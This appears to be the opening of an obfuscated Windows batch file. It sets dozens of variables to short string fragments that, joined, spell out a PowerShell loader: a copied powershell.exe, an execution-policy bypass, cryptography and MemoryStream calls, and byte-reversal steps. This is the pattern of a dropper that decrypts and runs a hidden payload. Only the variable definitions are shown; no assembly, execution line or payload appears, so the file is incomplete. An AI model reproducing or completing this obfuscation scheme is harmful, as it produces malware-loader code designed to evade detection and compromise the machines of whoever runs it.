@echo off
set "poVLkWjTMo= /"
set "heBQNesFHr=he"
set "XJtICykFiY=rs"
set "iEQBmlVzfm=Po"
set "kbvSoMDkUl=.e"
set "RNAgpaEJIN=py"
set "dUSoBvvQYo=\W"
set "KYncRNZlrd=Sy"
set "MdnBfNuSGh=he"
set "hvHWbDGXUf=Wi"
set "XdfAnfKZLb=xe"
set "qOIqNItMCI=:\"
set "HqXZNfJICb=y "
set "bmbqAmoYUg=1."
set "wCOwYKEgpm=nd"
set "sQxKDEYqsr=co"
set "UVTDamInPb=ll"
set "yvFnyDvPQy=em"
set "vWTwJiJnyu=po"
set "yGsOReDyGm=0\"
set "klQyfHTCdO=we"
set "mytrsptZEn=in"
set "axbHzdkJxO=rS"
set "eDuacLDici=\v"
set "qCAaUTzZVL=we"
set "VHmqvrViin= C"
set "DbAzWnQUIj=ll"
set "KoRyBJCfnm=32"
set "emwqarnBWX=st"
set "skuTtQuYPr=do"
set "IPifadfksG=ow"
set "PinJUEDqLd=ws"
set "HShZGzappR=s\"
set "tzhNsHrXqs=cd"
set "bCTLzQbWiu= %~dp0"
set "ElrvTKgpAz=ew-O"
set "tbmjWXEHPD=$DlT"
set "zEPBGjwMMZ=1..-"
set "aRDbHHVafT=ewLi"
set "CzGXZTxWGB=File"
set "OcajBbWdPN=oArr"
set "LWsYWEYgFw=HAjN"
set "zoJlfPqJgz=);$f"
set "hAhBEHILvL=();$"
set "ZqduIMwjzP=mory"
set "TlGuCUxGcC=();$"
set "OjEByuOUvm=xkU."
set "oZpqTHyjYc=eam("
set "NKMnWqpLBz=ct S"
set "kivhUAkayp=]::("
set "naEZzCmkrS=y]::"
set "vxdInRIJyQ=bypa"
set "zMjdYSrYOd=O.Me"
set "WXIJcUOEKF=Obje"
set "nVmOKejUby=pher"
set "TJzTfRfKqG=yste"
set "IBuUKOQEXV=xc ="
set "kslmJMwmnZ=Fina"
set "XaqHWMDMPm=ing("
set "RvgpCfXHDs=[Sys"
set "LWDHXPvFBz=;$rh"
set "tsEcSJAkqZ=yste"
set "lfoMYthAed=S = "
set "zmlUbjFsOk=raph"
